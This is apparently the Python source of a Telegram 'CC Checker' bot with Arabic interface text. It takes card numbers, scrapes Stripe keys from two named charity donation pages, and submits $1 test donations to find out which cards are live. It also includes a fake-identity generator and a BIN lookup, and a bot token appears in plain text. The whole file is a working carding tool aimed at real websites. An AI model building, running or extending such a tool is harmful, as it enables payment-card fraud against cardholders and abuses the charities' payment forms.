import telebot, os
import re, json
import requests
import time, random
import string
from telebot import types
from datetime import datetime, timedelta
from html import unescape
import urllib3
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== EMOJI CONFIGURATION ====================
E_001 = "4956222745814762495"
E_002 = "5945194134573685106"
E_003 = "5945183830947142048"
E_004 = "5945125479521458519"
E_005 = "5943007373449763836"
E_006 = "5944855107035209527"
E_007 = "5956409844666738131"
E_008 = "5956097759458106083"
E_009 = "5944794487866791656"
E_010 = "5945161424102759585"
E_011 = "5945263167583033922"
E_012 = "5945223615229204284"
E_013 = "5944785030348807288"
E_014 = "5944896244231968531"
E_015 = "5947299570491856688"
E_016 = "5947177498931369799"
E_017 = "5947500493356931114"
E_018 = "5945008295633754676"
E_019 = "5944769654365886542"
E_020 = "5945168588108209063"

E_FIRE = E_001
E_DIAMOND = E_002
E_CROSS = E_003
E_CLOCK = E_004
E_CARD = E_005
E_BOT = E_006
E_CHECK = E_007
E_STAR = E_008
E_CROWN = E_009
E_LOCK = E_010
E_BOLT = E_011
E_SHIELD = E_012
E_GLOBE = E_013
E_KEY = E_014
E_WARN = E_015
E_STOP = E_016
E_ADD = E_017
E_LIST = E_018
E_MANUAL = E_019

BTN_DIAMOND = "💎"
BTN_CROWN = "👑"
BTN_GLOBE = "📢"
BTN_CHECK = "✅"
BTN_WARN = "⚠️"
BTN_STOP = "⛔"
BTN_ADD = "➕"
BTN_LIST = "📋"
BTN_CLOCK = "⏳"
BTN_FIRE = "🔥"
BTN_STAR = "⭐"
BTN_CARD = "💳"
BTN_BOT = "🤖"
BTN_BOLT = "⚡"
BTN_SHIELD = "🛡️"
BTN_RANDOM = "🎲"

def tge(emoji_id, fallback="⚡"):
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'

_L = '[<a href="https://t.me/rivatry_bot">ϟ</a>]'

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8407490230:AAFEnKQAZ9sREuVY3UJ7Rf2yil23TCp7eRg"
ADMIN_ID = 6843321125

CHANNEL_USERNAME = "@tools_riva"
CHANNEL_URL = "https://t.me//tools_riva"

# ==================== FREE MODE CONTROL ====================
free_mode = True

# ==================== FAST SESSION ====================
fast_session = requests.Session()
fast_session.verify = False
fast_session.headers.update({
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive'
})

# ==================== GATEWAYS ====================
GATEWAYS = [
    {
        'name': 'Stripe_Donation_1',
        'display_name': 'Stripe Donation 1',
        'site_url': 'https://ciscranbourne.org.au/donate/',
        'base_url': 'https://ciscranbourne.org.au',
        'clean_url': 'https://ciscranbourne.org.au/donate/',
        'domain': 'ciscranbourne.org.au',
        'icon': '💳',
        'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    },
    {
        'name': 'Stripe_Donation_2',
        'display_name': 'Stripe Donation 2',
        'site_url': 'https://delawarecf.org/imapacteducation/',
        'base_url': 'https://delawarecf.org',
        'clean_url': 'https://delawarecf.org/imapacteducation/',
        'domain': 'delawarecf.org',
        'icon': '💳',
        'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    }
]

REQUEST_TIMEOUT = 8
active_scans = set()
command_usage = {}
stopuser = {}

# ==================== BAN SYSTEM ====================
BANNED_FILE = "banned_users.json"

def load_banned():
    try:
        with open(BANNED_FILE, "r") as f:
            return json.load(f)
    except:
        return []

def save_banned(data):
    with open(BANNED_FILE, "w") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def is_banned(user_id):
    return str(user_id) in load_banned()

def ban_user(user_id):
    data = load_banned()
    if str(user_id) not in data:
        data.append(str(user_id))
        save_banned(data)
        return True
    return False

def unban_user(user_id):
    data = load_banned()
    if str(user_id) in data:
        data.remove(str(user_id))
        save_banned(data)
        return True
    return False

# ==================== ADMIN SYSTEM ====================
def load_admins():
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except:
        return [ADMIN_ID]

def save_admins(data):
    with open('admins.json', 'w') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

def is_admin(user_id):
    return user_id in load_admins()

# ==================== DATA MANAGEMENT ====================
def initialize_data_file():
    if not os.path.exists('data.json'):
        default_data = {}
        with open('data.json', 'w') as f:
            json.dump(default_data, f, ensure_ascii=False, indent=4)

def register_new_user(user):
    try:
        with open('data.json', 'r') as f:
            data = json.load(f)
    except:
        data = {}
    user_id = str(user.id)
    if user_id not in data:
        data[user_id] = {
            'id': user.id,
            'username': f"@{user.username}" if user.username else "بدون يوزر",
            'name': user.first_name,
            'checks': 0,
            'level': 1,
            'last_level_up': 0
        }
        with open('data.json', 'w') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return True
    return False

def get_users_count():
    try:
        with open('data.json', 'r') as f:
            data = json.load(f)
        return len(data)
    except:
        return 0

def increment_checks(user_id):
    try:
        with open('data.json', 'r') as f:
            data = json.load(f)
    except:
        data = {}
    uid = str(user_id)
    if uid in data:
        data[uid]['checks'] = data[uid].get('checks', 0) + 1
        old_level = data[uid].get('level', 1)
        new_level = 1 + (data[uid]['checks'] // 10)
        data[uid]['level'] = new_level
        with open('data.json', 'w') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return data[uid]['checks'], old_level, new_level
    return 0, 1, 1

def get_level(checks):
    return 1 + (checks // 10)

def get_level_title(level):
    titles = {
        1: "🥉 مبتدئ",
        5: "🥈 محترف",
        10: "🥇 خبير",
        20: "💎 أسطورة",
        50: "👑 ملك الفحص"
    }
    title = "🥉 مبتدئ"
    for lvl, t in sorted(titles.items()):
        if level >= lvl:
            title = t
    return title

def get_top_users(limit=10):
    try:
        with open('data.json', 'r') as f:
            data = json.load(f)
        users = []
        for uid, info in data.items():
            if info.get('checks', 0) > 0:
                users.append((uid, info['name'], info.get('checks', 0)))
        users.sort(key=lambda x: x[2], reverse=True)
        return users[:limit]
    except:
        return []

# ==================== CHANNEL SUBSCRIPTION CHECK (REMOVED) ====================
def is_subscribed(user_id):
    # Always return True to bypass subscription check
    return True

# ==================== CARD TYPE DETECTION ====================
def detect_card_type(card_number):
    card_number = str(card_number)
    if card_number.startswith('4'):
        return 'Visa', '💳'
    elif card_number.startswith(('51', '52', '53', '54', '55')):
        return 'MasterCard', '🟠'
    elif card_number.startswith(('34', '37')):
        return 'American Express', '🔵'
    elif card_number.startswith('6011') or card_number.startswith('65'):
        return 'Discover', '🟣'
    else:
        return 'Unknown', '💠'

# ==================== ANTI-SPAM ====================
user_checks = {}

def is_spam(user_id):
    now = datetime.now()
    if user_id not in user_checks:
        user_checks[user_id] = []
    user_checks[user_id] = [t for t in user_checks[user_id] if (now - t).seconds < 60]
    user_checks[user_id].append(now)
    return len(user_checks[user_id]) > 5

# ==================== LOGS ====================
def save_log(card, status, user_name, gate_name):
    try:
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        masked = card[:6] + "******" + card[-4:]
        with open("logs.txt", "a", encoding="utf-8") as f:
            f.write(f"[{now}] {masked} | {status} | {user_name} | {gate_name}\n")
    except:
        pass

# ==================== BIN LOOKUP ====================
def dato(zh):
    try:
        api_url = requests.get("https://bins.antipublic.cc/bins/" + zh).json()
        brand = api_url["brand"]
        card_type = api_url["type"]
        level = api_url["level"]
        bank = api_url["bank"]
        country_name = api_url["country_name"]
        country_flag = api_url["country_flag"]
        return {
            "brand": brand,
            "type": card_type,
            "level": level,
            "bank": bank,
            "country_name": country_name,
            "country_flag": country_flag
        }
    except:
        return {"brand": "N/A", "type": "N/A", "level": "N/A", "bank": "N/A", "country_name": "N/A", "country_flag": ""}

# ==================== CARD FORMATTER ====================
def reg(cc):
    try:
        patterns = [
            r'(\d{16})[|/ ](\d{1,2})[|/ ](\d{2,4})[|/ ](\d{3,4})',
            r'(\d{15})[|/ ](\d{1,2})[|/ ](\d{2,4})[|/ ](\d{3,4})',
            r'(\d{16})[|/ ](\d{1,2})[|/ ](\d{2,4})',
            r'(\d{15})[|/ ](\d{1,2})[|/ ](\d{2,4})'
        ]
        for pattern in patterns:
            match = re.search(pattern, cc)
            if match:
                card = match.group(1)
                month = match.group(2).zfill(2)
                year = match.group(3)
                if len(year) == 2:
                    year = '20' + year
                if len(match.groups()) >= 4:
                    cvv = match.group(4)
                else:
                    cvv = str(random.randint(0, 999)).zfill(3)
                return f"{card}|{month}|{year}|{cvv}"
        return None
    except:
        return None

# ==================== STRIPE FUNCTIONS ====================
def random_email():
    names = ['john', 'emma', 'michael', 'sarah', 'david', 'lisa', 'james', 'anna']
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{random.choice(names)}{random.randint(100,999)}@{random.choice(domains)}"

def extract_data(gateway):
    s = fast_session
    headers = {'User-Agent': gateway['ua'], 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
    try:
        r = s.get(gateway['site_url'], headers=headers, timeout=REQUEST_TIMEOUT)
        html = r.text
        if 'givewp-route=donation-form-view' in html and 'givewp-route-signature' not in html:
            fid = re.search(r'form-id[=]+(\d+)', html)
            if fid:
                iframe = f"{gateway['base_url']}/?givewp-route=donation-form-view&form-id={fid.group(1)}"
                r2 = s.get(iframe, headers=headers, timeout=REQUEST_TIMEOUT)
                html = r2.text
        fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
        fi = re.search(r'name="give-form-id" value="(.*?)"', html)
        nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
        pk = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html)
        if not all([fp, fi, nc, pk]):
            return None
        sa = re.search(r'(acct_[A-Za-z0-9]+)', html)
        return {
            'fp': fp.group(1),
            'fi': fi.group(1),
            'nc': nc.group(1),
            'pk': pk.group(1),
            'sa': sa.group(1) if sa else '',
            'session': s
        }
    except:
        return None

def extract_stripe_response(text):
    error_div = re.search(r'class="give_notices give_errors">(.*?)</div>\s*</div>', text, re.DOTALL)
    if error_div:
        raw_error = error_div.group(1)
        clean_error = re.sub(r'<[^>]+>', '', raw_error)
        clean_error = unescape(clean_error).strip()
        clean_error = re.sub(r'\s+', ' ', clean_error)
        clean_error = clean_error.replace('Error:', '').strip()
        return f"Declined | {clean_error}"
    if 'give-donation-confirmation' in text or 'donation-confirmation' in text:
        return "Charged | Donation confirmed"
    if 'Thank you for your donation' in text:
        return "Charged | Thank you for your donation"
    if 'receipt' in text.lower() and 'donation' in text.lower() and 'give_error' not in text:
        return "Charged | Payment succeeded"
    notice_div = re.search(r'class="give_notices[^"]*">(.*?)</div>', text, re.DOTALL)
    if notice_div:
        cn = re.sub(r'<[^>]+>', '', notice_div.group(1))
        cn = unescape(cn).strip()
        cn = re.sub(r'\s+', ' ', cn)
        return f"Stripe Response | {cn}"
    return "Unknown Response"

def check_card_on_gateway(card_data, gateway, form_data):
    parts = card_data.split('|')
    if len(parts) < 4:
        return {'gateway': gateway['display_name'], 'status': 'INVALID', 'message': 'INVALID_FORMAT', 'charged': False}
    cc, mm, yy, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    yy_short = yy if len(yy) == 2 else yy[-2:]
    email = random_email()
    s = form_data['session']
    fp, fi, nc, pk, sa = form_data['fp'], form_data['fi'], form_data['nc'], form_data['pk'], form_data['sa']
    sa_param = f'&_stripe_account={sa}' if sa else ''
    headers_ajax = {
        'origin': gateway['base_url'],
        'referer': gateway['site_url'],
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': gateway['ua'],
        'x-requested-with': 'XMLHttpRequest',
    }
    data_ajax = {
        'give-honeypot': '', 'give-form-id-prefix': fp, 'give-form-id': fi,
        'give-form-title': 'Give a Donation', 'give-current-url': gateway['site_url'],
        'give-form-url': gateway['site_url'], 'give-form-minimum': '1.00',
        'give-form-maximum': '999999.99', 'give-form-hash': nc,
        'give-price-id': 'custom', 'give-amount': '1.00',
        'give_stripe_payment_method': '', 'payment-mode': 'stripe',
        'give_first': 'riva', 'give_last': 'riva', 'give_email': email,
        'give_comment': '', 'card_name': 'riva', 'billing_country': 'US',
        'card_address': 'riva sj', 'card_address_2': '', 'card_city': 'tomrr',
        'card_state': 'NY', 'card_zip': '10090', 'give_action': 'purchase',
        'give-gateway': 'stripe', 'action': 'give_process_donation', 'give_ajax': 'true'
    }
    try:
        # Get Payment Method ID
        stripe_pm_url = f'https://api.stripe.com/v1/payment_methods'
        pm_data = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy_short}&key={pk}{sa_param}'
        pm_headers = {'User-Agent': gateway['ua'], 'Content-Type': 'application/x-www-form-urlencoded'}
        r_pm = s.post(stripe_pm_url, data=pm_data, headers=pm_headers, timeout=REQUEST_TIMEOUT)
        pm_json = r_pm.json()
        if 'error' in pm_json:
            return {'gateway': gateway['display_name'], 'status': 'DECLINED', 'message': pm_json['error'].get('message', 'PM Error'), 'charged': False}
        pm_id = pm_json['id']
        data_ajax['give_stripe_payment_method'] = pm_id
        # Process Donation
        r_final = s.post(f"{gateway['base_url']}/wp-admin/admin-ajax.php", data=data_ajax, headers=headers_ajax, timeout=REQUEST_TIMEOUT)
        res_text = r_final.text
        final_status = extract_stripe_response(res_text)
        is_charged = "Charged" in final_status
        return {'gateway': gateway['display_name'], 'status': 'SUCCESS' if is_charged else 'DECLINED', 'message': final_status, 'charged': is_charged}
    except Exception as e:
        return {'gateway': gateway['display_name'], 'status': 'ERROR', 'message': str(e), 'charged': False}

def format_check_msg(card, category, result, bin_info, elapsed, user_name, gate_name, amount):
    card_brand = bin_info.get('brand', '').upper()
    if 'VISA' in card_brand:
        brand_emoji = tge("5278219081105811309", "💳")
        brand_emoji_fb = '💳'
    elif 'MASTERCARD' in card_brand or 'MASTER' in card_brand:
        brand_emoji = tge("5278219081105811309", "💳")
        brand_emoji_fb = '💳'
    else:
        brand_emoji = tge("4956233646441760046", "🌊")
        brand_emoji_fb = '💰'
    if category == 'charged':
        status_text = "Charged 🔥"
        response_text = f"Charged ${amount} {tge(E_FIRE, '🔥')}"
        response_text_fb = f"Charged ${amount} 🔥"
    else:
        status_text = "Declined"
        response_text = f"❌ {result}"
        response_text_fb = f"❌ {result}"
    user_name_display = f"{user_name} {tge('5848338971326682635', '💪')}"
    user_name_display_fb = f"{user_name} 💪"
    gate_tag = f"#{gate_name.replace(' ', '_')}"
    msg_premium = f"""{gate_tag} [/chk] {tge("5041994565565809886", "🌊")}
- - - - - - - - - - - - - - - - - - - - - - -
{_L} 𝐂𝐚𝐫𝐝: <code>{card}</code> {brand_emoji}
{_L} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
{_L} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response_text}
- - - - - - - - - - - - - - - - - - - - - - -
{_L} 𝐁𝐢𝐧: {bin_info.get('brand','N/A')} - {bin_info.get('type','N/A')} - {bin_info.get('level','N/A')}
{_L} 𝐁𝐚𝐧𝐤: {bin_info.get('bank','N/A')} - {bin_info.get('country_flag','')}
{_L} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get('country_name','N/A')} [ {bin_info.get('country_flag','')} ]
- - - - - - - - - - - - - - - - - - - - - - -
{_L} T/t : {elapsed:.2f}s | Proxy : Live {tge(E_STAR, "😈")}
[<a href="https://t.me/rivatry_bot">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: {user_name_display}
[<a href="https://t.me/rivatry_bot">⌥</a>] 
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/F_S_G">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href="https://t.me/F_S_G">RiVa</a> - {tge(E_CHECK, "🌟")}"""
    msg_fallback = f"""{gate_tag} [/chk] 🌊
- - - - - - - - - - - - - - - - - - - - - - -
{_L} 𝐂𝐚𝐫𝐝: <code>{card}</code> {brand_emoji_fb}
{_L} 𝐒𝐭𝐚𝐭𝐮𝐬: {status_text}
{_L} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {response_text_fb}
- - - - - - - - - - - - - - - - - - - - - - -
{_L} 𝐁𝐢𝐧: {bin_info.get('brand','N/A')} - {bin_info.get('type','N/A')} - {bin_info.get('level','N/A')}
{_L} 𝐁𝐚𝐧𝐤: {bin_info.get('bank','N/A')} - {bin_info.get('country_flag','')}
{_L} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get('country_name','N/A')} [ {bin_info.get('country_flag','')} ]
- - - - - - - - - - - - - - - - - - - - - - -
{_L} T/t : {elapsed:.2f}s | Proxy : Live 😈
[<a href="https://t.me/rivatry_bot">⌥</a>] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐛𝐲: {user_name_display_fb}
[<a href="https://t.me/rivatry_bot">⌥</a>] 
- - - - - - - - - - - - - - - - - - - - - - -
[<a href="https://t.me/F_S_G">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href="https://t.me/F_S_G">RiVa</a> - 🌟"""
    return msg_premium, msg_fallback

def send_check_result(chat_id, message_id, card, category, result, bin_info, elapsed, user_name, gate_name, amount):
    msg_premium, msg_fallback = format_check_msg(card, category, result, bin_info, elapsed, user_name, gate_name, amount)
    try:
        bot.delete_message(chat_id, message_id)
    except:
        pass
    try:
        bot.send_message(chat_id=chat_id, text=msg_premium, parse_mode='HTML', disable_web_page_preview=False)
    except:
        try:
            bot.send_message(chat_id=chat_id, text=msg_fallback, parse_mode='HTML', disable_web_page_preview=False)
        except:
            pass

# ==================== BOT INITIALIZATION ====================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')

# ==================== COMMANDS ====================
@bot.message_handler(commands=['ban'])
def ban_command(message):
    if not is_admin(message.from_user.id):
        return
    try:
        target_user = int(message.text.split()[1])
        if ban_user(target_user):
            bot.reply_to(message, f"✅ تم تبنيد المستخدم {target_user}")
        else:
            bot.reply_to(message, "⚠️ المستخدم متبند بالفعل.")
    except:
        bot.reply_to(message, "⚠️ الاستخدام: /ban [الايدي]")

@bot.message_handler(commands=['unban'])
def unban_command(message):
    if not is_admin(message.from_user.id):
        return
    try:
        target_user = int(message.text.split()[1])
        if unban_user(target_user):
            bot.reply_to(message, f"♻️ تم فك تبنيد المستخدم {target_user}")
        else:
            bot.reply_to(message, "⚠️ المستخدم مش متبند.")
    except:
        bot.reply_to(message, "⚠️ الاستخدام: /unban [الايدي]")

@bot.message_handler(commands=['clearbans'])
def clearbans_command(message):
    if not is_admin(message.from_user.id):
        return
    save_banned([])
    bot.reply_to(message, "✅ تم فك تبنيد كل المستخدمين")

@bot.message_handler(commands=['addadmin'])
def addadmin_command(message):
    if not is_admin(message.from_user.id):
        return
    try:
        target = int(message.text.split()[1])
        data = load_admins()
        if target not in data:
            data.append(target)
            save_admins(data)
            bot.reply_to(message, f"✅ تم إضافة {target} كأدمن")
        else:
            bot.reply_to(message, "⚠️ هو أدمن بالفعل")
    except:
        bot.reply_to(message, "⚠️ الاستخدام: /addadmin [الايدي]")

@bot.message_handler(commands=['removeadmin'])
def removeadmin_command(message):
    if not is_admin(message.from_user.id):
        return
    try:
        target = int(message.text.split()[1])
        if target == ADMIN_ID:
            bot.reply_to(message, "⚠️ ما تقدرش تشيل المالك الأساسي")
            return
        data = load_admins()
        if target in data:
            data.remove(target)
            save_admins(data)
            bot.reply_to(message, f"✅ تم إزالة {target} من الأدمنية")
        else:
            bot.reply_to(message, "⚠️ مش أدمن أصلاً")
    except:
        bot.reply_to(message, "⚠️ الاستخدام: /removeadmin [الايدي]")

@bot.message_handler(commands=['leave'])
def leave_command(message):
    if not is_admin(message.from_user.id):
        return
    if message.chat.type == 'private':
        bot.reply_to(message, "⚠️ الأمر ده شغال في الجروبات بس")
        return
    try:
        bot.leave_chat(message.chat.id)
    except:
        pass

@bot.message_handler(commands=['addgate'])
def addgate_command(message):
    if not is_admin(message.from_user.id):
        return
    try:
        args = message.text.split(' ', 1)[1]
        parts = args.split('|')
        name = parts[0].strip()
        url = parts[1].strip()
        if not url.startswith('http'):
            url = 'https://' + url
        domain = url.split('/')[2] if '://' in url else url.split('/')[0]
        new_gate = {
            'name': name.replace(' ', '_'),
            'display_name': name,
            'site_url': url if url.endswith('/') else url + '/',
            'base_url': (url.split('//')[0] + '//' + url.split('//')[1].split('/')[0]) if '://' in url else 'https://' + url.split('/')[0],
            'clean_url': url if url.endswith('/') else url + '/',
            'domain': domain,
            'icon': '🆕',
            'ua': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
        }
        GATEWAYS.append(new_gate)
        bot.reply_to(message, f"✅ تم إضافة البوابة: {name}\nالعدد الآن: {len(GATEWAYS)}")
    except:
        bot.reply_to(message, "⚠️ الاستخدام: /addgate [الاسم]|[الرابط]\nمثال: /addgate MyGate|https://site.com/donate/")

@bot.message_handler(commands=['delgate'])
def delgate_command(message):
    if not is_admin(message.from_user.id):
        return
    try:
        idx = int(message.text.split()[1]) - 1
        if 0 <= idx < len(GATEWAYS):
            removed = GATEWAYS.pop(idx)
            bot.reply_to(message, f"✅ تم حذف البوابة: {removed['display_name']}\nالعدد الآن: {len(GATEWAYS)}")
        else:
            bot.reply_to(message, f"⚠️ رقم غير صالح. البوابات من 1 إلى {len(GATEWAYS)}")
    except:
        bot.reply_to(message, f"⚠️ الاستخدام: /delgate [الرقم]\nالبوابات: 1-{len(GATEWAYS)}")

@bot.message_handler(commands=['checkuser'])
def checkuser_command(message):
    if not is_admin(message.from_user.id):
        return
    try:
        target = int(message.text.split()[1])
        try:
            with open('data.json', 'r') as f:
                data = json.load(f)
        except:
            data = {}
        if str(target) in data:
            u = data[str(target)]
            level = u.get('level', 1)
            title = get_level_title(level)
            msg = f"""
🔍 <b>User Found</b>

🆔 ID: <code>{target}</code>
👤 Name: <code>{u.get('name','N/A')}</code>
📛 Username: {u.get('username','N/A')}
🔢 Checks: {u.get('checks', 0)}
📊 Level: {level} ({title})
🚫 Banned: {'نعم' if is_banned(target) else 'لا'}
"""
        else:
            msg = f"⚠️ المستخدم {target} مش موجود في قاعدة البيانات"
        bot.reply_to(message, msg, parse_mode='HTML')
    except:
        bot.reply_to(message, "⚠️ الاستخدام: /checkuser [الايدي]")

@bot.message_handler(commands=['top'])
def top_command(message):
    if is_banned(message.from_user.id):
        return
    top_users = get_top_users(10)
    if not top_users:
        bot.reply_to(message, "لا يوجد مستخدمين بعد")
        return
    msg = "🏆 <b>Top Checkers</b>\n\n"
    medals = ["🥇", "🥈", "🥉"] + ["📍"] * 7
    for i, (uid, name, checks) in enumerate(top_users, 1):
        level = get_level(checks)
        title = get_level_title(level)
        msg += f"{medals[i-1]} <b>{name}</b> — <code>{checks}</code> فحص | {title}\n"
    bot.reply_to(message, msg, parse_mode='HTML')

@bot.message_handler(commands=['stats'])
def stats_command(message):
    if not is_admin(message.from_user.id):
        return
    users_count = get_users_count()
    banned_count = len(load_banned())
    admins_count = len(load_admins())
    stats_text = f"""
📊 <b>Bot Statistics</b>

👥 المستخدمين: {users_count}
👑 الأدمنز: {admins_count}
🚫 المتبندين: {banned_count}
💳 البوابات: {len(GATEWAYS)}
"""
    bot.reply_to(message, stats_text, parse_mode='HTML')

@bot.message_handler(commands=['bin'])
def info_command(message):
    if is_banned(message.from_user.id):
        return
    # Subscription check removed
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ الاستخدام: /bin [البين]\nمثال: /info 401795")
            return
        bin_num = parts[1][:6]
        info = dato(bin_num)
        card_type, card_emoji = detect_card_type(bin_num)
        msg = f"""
🔎 <b>BIN Information</b>

💳 BIN: <code>{bin_num}</code>
🏦 Brand: {info.get('brand','N/A')}
📋 Type: {info.get('type','N/A')}
⭐ Level: {info.get('level','N/A')}
🏛 Bank: {info.get('bank','N/A')}
🌍 Country: {info.get('country_name','N/A')} {info.get('country_flag','')}
🔍 Detected: {card_emoji} {card_type}
"""
        bot.reply_to(message, msg, parse_mode='HTML')
    except:
        bot.reply_to(message, "❌ خطأ في جلب البيانات")

@bot.message_handler(commands=['fake'])
def generate_full_identity(message):
    if is_banned(message.from_user.id):
        return
    # Subscription check removed
    try:
        cities_data = [
            {"city": "New York", "state": "NY", "zip": "10001"},
            {"city": "Los Angeles", "state": "CA", "zip": "90001"},
            {"city": "Chicago", "state": "IL", "zip": "60601"},
        ]
        first_names = ["James", "Robert", "John", "Michael", "David", "William", "Mary"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Miller"]
        location = random.choice(cities_data)
        f_name = random.choice(first_names)
        l_name = random.choice(last_names)
        address = f"{random.randint(100, 9999)} {random.choice(['Main St','Oak Ave','Broadway'])}"
        phone = f"+1 ({random.randint(200, 999)}) {random.randint(100, 999)}-{random.randint(1000, 9999)}"
        temp_email = f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=7))}@1secmail.com"
        photo_url = "https://t.me/bottryriva/22"
        res_text = (
            f"👤 <b>FULL INFORMATION GENERATED</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"📝 Name: <code>{f_name} {l_name}</code>\n🏠 Address: <code>{address}</code>\n"
            f"🏙 City: <code>{location['city']}</code>\n🗺 State: <code>{location['state']}</code>\n"
            f"📮 ZIP: <code>{location['zip']}</code>\n📞 Phone: <code>{phone}</code>\n📧 Email: <code>{temp_email}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n🤖 Bot By @F_S_G"
        )
        bot.send_photo(message.chat.id, photo_url, caption=res_text, parse_mode='HTML')
    except:
        bot.reply_to(message, "❌ حصلت مشكلة، جرب تاني.")

@bot.message_handler(commands=['stopfree'])
def stopfree_command(message):
    global free_mode
    if not is_admin(message.from_user.id):
        return
    free_mode = False
    bot.reply_to(message, "⛔ تم إيقاف الفحص المجاني\nالبوت الآن متوقف للمستخدمين")

@bot.message_handler(commands=['startfree'])
def startfree_command(message):
    global free_mode
    if not is_admin(message.from_user.id):
        return
    free_mode = True
    bot.reply_to(message, "✅ تم تفعيل الفحص المجاني\nالبوت شغال الآن")

@bot.message_handler(commands=['cmds'])
def handle_my_command(message):
    msg = """📋 <b>أوامر المستخدمين:</b>
    
🔹 /start - تشغيل البوت
🔹 /help - المساعدة
🔹 /chk [الكرت] - فحص كرت
🔹 .chk [الكرت] - فحص سريع
🔹 /bin [bin] - فحص BIN
🔹 /fake - توليد هوية
🔹 /top - ترتيب المستخدمين
🔹 /cmds - أوامر المستخدمين
🔹 /admin - أوامر الأدمنز"""
    bot.reply_to(message, msg, parse_mode='HTML')

@bot.message_handler(commands=['admin'])
def admin_commands(message):
    if not is_admin(message.from_user.id):
        return
    msg = """👑 <b>أوامر الأدمنز:</b>
    
🔸 /ban [ايدي] - تبنيد مستخدم
🔸 /unban [ايدي] - فك تبنيد
🔸 /clearbans - فك تبنيد الكل
🔸 /addadmin [ايدي] - إضافة أدمن
🔸 /removeadmin [ايدي] - إزالة أدمن
🔸 /leave - خروج من جروب
🔸 /addgate [اسم|رابط] - إضافة بوابة
🔸 /delgate [رقم] - حذف بوابة
🔸 /checkuser [ايدي] - بيانات مستخدم
🔸 /stats - إحصائيات البوت
🔸 /broadcast أو /bc - إذاعة
🔸 /stopfree - إيقاف المجاني
🔸 /startfree - تفعيل المجاني"""
    bot.reply_to(message, msg, parse_mode='HTML')

@bot.message_handler(commands=["start"])
def start(message):
    if is_banned(message.from_user.id):
        bot.reply_to(message, "⛔ أنت محظور من استخدام البوت.")
        return
    def my_function():
        name = message.from_user.first_name
        user_id = message.from_user.id
        if register_new_user(message.from_user):
            notify_msg = (
                f"🆕 <b>مستخدم جديد دخل البوت</b>\n"
                f"الاسم: <code>{name}</code>\n"
                f"اليوزر: @{message.from_user.username or 'بدون'}\n"
                f"الايدي: <code>{user_id}</code>"
            )
            try:
                bot.send_message(ADMIN_ID, notify_msg, parse_mode='HTML')
            except:
                pass
        
        # Subscription check bypass
        checks, old_level, new_level = 0, 1, 1
        try:
            with open('data.json', 'r') as f:
                data = json.load(f)
            uid = str(user_id)
            checks = data[uid].get('checks', 0)
            new_level = data[uid].get('level', 1)
        except:
            pass
        title = get_level_title(new_level)
        if user_id in load_admins():
            status_line = f"👑 Status: ADMIN"
        else:
            status_line = f"💎 Status: User (Level {new_level} - {title})"
        caption_text = (
            f"😈 WELCOME {name} - ✅\n\n"
            f"{status_line}\n"
            f"🔢 فحوصاتك: {checks}\n\n"
            f"💳 CC Checker Bot 🤖\n\n"
            f"⭐ Bot By @F_S_G 👑"
        )
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            types.InlineKeyboardButton(f"{BTN_DIAMOND} مجاني {BTN_DIAMOND}", callback_data='free_info'),
            types.InlineKeyboardButton(f"{BTN_CROWN} المطور {BTN_CROWN}", url="https://t.me/F_S_G"),
            types.InlineKeyboardButton(f"{BTN_GLOBE} قناتي {BTN_GLOBE}", url=CHANNEL_URL)
        )
        welcome_images = ["https://t.me/bottryriva/22", "https://t.me/bottryriva/20"]
        if not hasattr(start, '_img_index'):
            start._img_index = 0
        img_url = welcome_images[start._img_index % 2]
        start._img_index += 1
        try:
            bot.send_photo(message.chat.id, img_url, caption=caption_text, reply_markup=keyboard, parse_mode='HTML')
        except:
            bot.send_message(chat_id=message.chat.id, text=caption_text, reply_markup=keyboard, parse_mode='HTML')
    threading.Thread(target=my_function).start()

